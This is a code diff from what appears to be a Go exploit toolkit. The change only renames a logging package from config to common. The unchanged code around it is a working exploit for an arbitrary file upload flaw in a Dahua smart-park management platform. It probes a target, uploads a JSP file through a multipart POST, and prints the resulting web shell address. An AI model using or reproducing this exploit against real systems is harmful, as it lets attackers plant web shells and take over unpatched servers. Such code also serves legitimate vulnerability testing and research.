@@ -1,7 +1,7 @@
 package poc
 
 import (
-	"PocSir/config"
+	"PocSir/common"
 	"bytes"
 	"crypto/tls"
 	"io"
@@ -37,13 +37,13 @@ func DaHua_Video_Upload(target string) {
 	//创建文件表单字段
 	file, err := writer.CreateFormFile("Filedata", "Test.jsp")
 	if err != nil {
-		config.ErrMsg.Println(err)
+		common.ErrMsg.Println(err)
 		return
 	}
 
 	open, err := os.Open("test.jsp")
 	if err != nil {
-		config.ErrMsg.Printf("[-]%v\n", err)
+		common.ErrMsg.Printf("[-]%v\n", err)
 		return
 	}
 	defer open.Close()
@@ -52,13 +52,13 @@ func DaHua_Video_Upload(target string) {
 	writer.WriteField("Submit", "submit")
 	err = writer.Close()
 	if err != nil {
-		config.ErrMsg.Println(err)
+		common.ErrMsg.Println(err)
 		return
 	}
 
 	req1, err := http.NewRequest("GET", pocUrl, nil)
 	if err != nil {
-		config.ErrMsg.Printf("[-]Error creating request: %v\n", err)
+		common.ErrMsg.Printf("[-]Error creating request: %v\n", err)
 		return
 	}
 
@@ -67,15 +67,15 @@ func DaHua_Video_Upload(target string) {
 	}
 	resp1, err := client.Do(req1)
 	if err != nil {
-		config.ErrMsg.Printf("[-]%s is timeout\n", target)
+		common.ErrMsg.Printf("[-]%s is timeout\n", target)
 		return
 	}
 	defer resp1.Body.Close()
 	if resp1.StatusCode == http.StatusMethodNotAllowed {
-		config.Right.Printf("[+]%s 存在大华 智慧园区综合管理平台video任意文件上传漏洞\n", target)
+		common.Right.Printf("[+]%s 存在大华 智慧园区综合管理平台video任意文件上传漏洞\n", target)
 		request, err := http.NewRequest("POST", pocUrl, body)
 		if err != nil {
-			config.ErrMsg.Printf("[-]Error creating request: %v\n", err)
+			common.ErrMsg.Printf("[-]Error creating request: %v\n", err)
 			return
 		}
 		for key, value := range headers {
@@ -83,7 +83,7 @@ func DaHua_Video_Upload(target string) {
 		}
 		resp, err := client.Do(request)
 		if err != nil {
-			config.ErrMsg.Printf("[-]%s is timeout\n", target)
+			common.ErrMsg.Printf("[-]%s is timeout\n", target)
 			return
 		}
 		defer resp.Body.Close()
@@ -101,13 +101,13 @@ func DaHua_Video_Upload(target string) {
 			if len(match) == 2 {
 				// 提取匹配到的"path"值
 				pathValue := match[1]
-				config.Right.Printf("[+]shell地址: %s\n", target+"/publishingImg/"+pathValue)
+				common.Right.Printf("[+]shell地址: %s\n", target+"/publishingImg/"+pathValue)
 			} else {
-				config.ErrMsg.Printf("[-]未找到path地址,请手工尝试\n")
+				common.ErrMsg.Printf("[-]未找到path地址,请手工尝试\n")
 			}
 		}
 	} else {
-		config.Right.Printf("[-]%s不存在大华智慧园区综合管理平台video任意文件上传漏洞\n", target)
+		common.Right.Printf("[-]%s不存在大华智慧园区综合管理平台video任意文件上传漏洞\n", target)
 	}
 
 }
